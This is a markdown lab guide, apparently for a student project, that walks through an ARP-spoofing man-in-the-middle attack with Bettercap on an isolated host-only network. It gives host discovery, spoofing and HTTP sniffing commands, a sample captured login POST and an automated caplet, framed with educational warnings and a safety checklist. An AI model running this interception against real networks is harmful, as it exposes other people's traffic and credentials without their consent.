# Bettercap Alternative – Step-by-Step MITM with Bettercap

## ⚠️ EDUCATIONAL USE ONLY – Run on Isolated Lab Network ONLY

This guide provides step-by-step instructions to perform the same MITM/ARP spoofing
demonstration using **Bettercap** instead of the Python script.

---

## Prerequisites
- Kali Linux (VM or bare metal)
- Bettercap installed: `sudo apt install bettercap`
- An **isolated lab network** (two VMs on a host-only network)
- Never run on public, corporate, or any network you do not own

## Network Setup (Recommended)
```
┌──────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  Attacker (Kali) │     │  Victim (Ubuntu) │     │  Gateway/Router  │
│  192.168.56.10   │────│  192.168.56.20   │────│  192.168.56.1    │
│  Interface: eth1 │     │                  │     │                  │
└──────────────────┘     └──────────────────┘     └──────────────────┘
            Host-Only Network: 192.168.56.0/24
```

## Step-by-Step Instructions

### Step 1: Start Bettercap
```bash
sudo bettercap -iface eth1
```

### Step 2: Discover Hosts on the Network
```
» net.probe on
» net.show
```
This will list all devices on the network with their IP and MAC addresses.

### Step 3: Set the Target
```
» set arp.spoof.targets 192.168.56.20
```

### Step 4: Enable ARP Spoofing
```
» arp.spoof on
```
Bettercap will now send forged ARP replies, positioning the attacker as the
man-in-the-middle between the victim and the gateway.

### Step 5: Enable HTTP Sniffer
```
» set net.sniff.local true
» net.sniff on
```
This captures all HTTP traffic passing through the attacker's machine.

### Step 6: Observe Captured Traffic
When the victim visits an HTTP website (e.g., `http://example.com`), you will
see the requests in the bettercap console:

```
[net.sniff.http.request] http://example.com/login
  POST username=test&password=secret123
```

### Step 7: Stop the Attack and Restore
```
» arp.spoof off
» net.sniff off
» exit
```

### Step 8: Verify ARP Tables are Restored
On the victim machine:
```bash
arp -a
```
The gateway MAC should return to its original hardware address.

---

## Bettercap Caplet (Automated Script)
Save this as `mitm_demo.cap` and run with: `sudo bettercap -iface eth1 -caplet mitm_demo.cap`

```
# mitm_demo.cap – Educational MITM Demo
net.probe on
sleep 5
set arp.spoof.targets 192.168.56.20
arp.spoof on
set net.sniff.local true
net.sniff on
```

---

## Safety Checklist
- [x] Use only on host-only or isolated virtual network
- [x] No real personal data involved
- [x] All VMs use test/fake accounts
- [x] Stop spoofing and restore ARP tables after demo
- [x] Document everything for the project report
